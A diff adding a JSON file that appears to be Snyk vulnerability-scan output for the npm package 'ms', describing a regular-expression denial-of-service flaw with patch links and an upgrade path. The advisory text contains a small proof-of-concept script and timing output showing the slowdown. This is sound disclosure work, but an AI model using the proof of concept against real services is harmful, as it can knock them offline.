@@ -1,0 +1,106 @@
+{
+  "ok": false,
+  "vulnerabilities": [
+    {
+      "title": "Regular Expression Denial of Service",
+      "credit": [
+        "Adam Baldwin"
+      ],
+      "creationTime": "2015-11-06T02:09:36.187Z",
+      "modificationTime": "2015-11-06T02:09:36.187Z",
+      "publicationTime": "2015-10-24T20:39:59.852Z",
+      "description": "## Overview\nms is vulnerable to regular expression denial of service (ReDoS) when extremely long version strings are parsed.\n\n\"The Regular expression Denial of Service (ReDoS) is a Denial of Service attack, that exploits the fact that most Regular Expression implementations may reach extreme situations that cause them to work very slowly (exponentially related to input size). An attacker can then cause a program using a Regular Expression to enter these extreme situations and then hang for a very long time.\"[1]\n\n_Original description taken from the [Node Security Project](https://nodesecurity.io/)_\n\n### Proof of Concept\n```\nvar ms = require('ms');\nvar genstr = function (len, chr) {\n   var result = \"\";\n   for (i=0; i<=len; i++) {\n       result = result + chr;\n   }\n\n   return result;\n}\n\nms(genstr(process.argv[2], \"5\") + \" minutea\");\n\n```\n\n### Results\nShowing increase in execution time based on the input string.\n```\n$ time node ms.js 10000\n\nreal\t0m0.758s\nuser\t0m0.724s\nsys\t0m0.031s\n\n$ time node ms.js 20000\n\nreal\t0m2.580s\nuser\t0m2.494s\nsys\t0m0.047s\n\n$ time node ms.js 30000\n\nreal\t0m5.747s\nuser\t0m5.483s\nsys\t0m0.080s\n\n$ time node ms.js 80000\n\nreal\t0m41.022s\nuser\t0m38.894s\nsys\t0m0.529s\n```\n\n\n## Recommendation\nUpdate to version 0.7.1 or greater. An alternative would be to limit the input length of the user input before passing it into ms.\n\n## References\n- https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS\n",
+      "semver": {
+        "vulnerable": "<=0.7.0",
+        "patched": ">0.7.0"
+      },
+      "CVSSv3": "",
+      "severity": "low",
+      "identifiers": {
+        "CWE": [
+          "CWE-400"
+        ],
+        "CVE": [],
+        "NSP": 46
+      },
+      "info": [
+        "https://nodesecurity.io/advisories/46"
+      ],
+      "patches": [
+        {
+          "urls": [
+            "https://s3.amazonaws.com/snyk-rules-pre-repository/snapshots/20151117_002112_base_patches/ms_20151024_0_0_48701f029417faf65e6f5e0b61a3cebe5436b07b.patch"
+          ],
+          "version": "=0.7.0",
+          "modificationTime": "2015-10-24T20:39:59.852Z",
+          "comments": [
+            "https://s3.amazonaws.com/snyk-rules-pre-repository/patches/npm/ms/48701f029417faf65e6f5e0b61a3cebe5436b07b.patch"
+          ]
+        },
+        {
+          "urls": [
+            "https://s3.amazonaws.com/snyk-rules-pre-repository/snapshots/20151117_002112_base_patches/ms_20151024_1_0_48701f029417faf65e6f5e0b61a3cebe5436b07b_snyk.patch"
+          ],
+          "version": "<0.7.0 >=0.6.0",
+          "modificationTime": "2015-10-24T20:39:59.852Z",
+          "comments": [
+            "https://s3.amazonaws.com/snyk-rules-pre-repository/patches/npm/ms/48701f029417faf65e6f5e0b61a3cebe5436b07b_snyk.patch"
+          ]
+        },
+        {
+          "urls": [
+            "https://s3.amazonaws.com/snyk-rules-pre-repository/snapshots/20151117_002112_base_patches/ms_20151024_2_0_48701f029417faf65e6f5e0b61a3cebe5436b07b_snyk2.patch"
+          ],
+          "version": "<0.6.0 >0.3.0",
+          "modificationTime": "2015-10-24T20:39:59.852Z",
+          "comments": [
+            "https://s3.amazonaws.com/snyk-rules-pre-repository/patches/npm/ms/48701f029417faf65e6f5e0b61a3cebe5436b07b_snyk2.patch"
+          ]
+        },
+        {
+          "urls": [
+            "https://s3.amazonaws.com/snyk-rules-pre-repository/snapshots/20151117_002112_base_patches/ms_20151024_3_0_48701f029417faf65e6f5e0b61a3cebe5436b07b_snyk3.patch"
+          ],
+          "version": "=0.3.0",
+          "modificationTime": "2015-10-24T20:39:59.852Z",
+          "comments": [
+            "https://s3.amazonaws.com/snyk-rules-pre-repository/patches/npm/ms/48701f029417faf65e6f5e0b61a3cebe5436b07b_snyk3.patch"
+          ]
+        },
+        {
+          "urls": [
+            "https://s3.amazonaws.com/snyk-rules-pre-repository/snapshots/20151117_002112_base_patches/ms_20151024_4_0_48701f029417faf65e6f5e0b61a3cebe5436b07b_snyk4.patch"
+          ],
+          "version": "=0.2.0",
+          "modificationTime": "2015-10-24T20:39:59.852Z",
+          "comments": [
+            "https://s3.amazonaws.com/snyk-rules-pre-repository/patches/npm/ms/48701f029417faf65e6f5e0b61a3cebe5436b07b_snyk4.patch"
+          ]
+        },
+        {
+          "urls": [
+            "https://s3.amazonaws.com/snyk-rules-pre-repository/snapshots/20151117_002112_base_patches/ms_20151024_5_0_48701f029417faf65e6f5e0b61a3cebe5436b07b_snyk5.patch"
+          ],
+          "version": "=0.1.0",
+          "modificationTime": "2015-10-24T20:39:59.852Z",
+          "comments": [
+            "https://s3.amazonaws.com/snyk-rules-pre-repository/patches/npm/ms/48701f029417faf65e6f5e0b61a3cebe5436b07b_snyk5.patch"
+          ]
+        }
+      ],
+      "moduleName": "ms",
+      "id": "npm:ms:20151024",
+      "below": "0.7.1",
+      "name": "ms",
+      "version": "0.6.2",
+      "from": [
+        "debug@2.1.0",
+        "ms@0.6.2"
+      ],
+      "upgradePath": [
+        "debug@2.2.0",
+        "ms@0.7.1"
+      ]
+    }
+  ]
+}
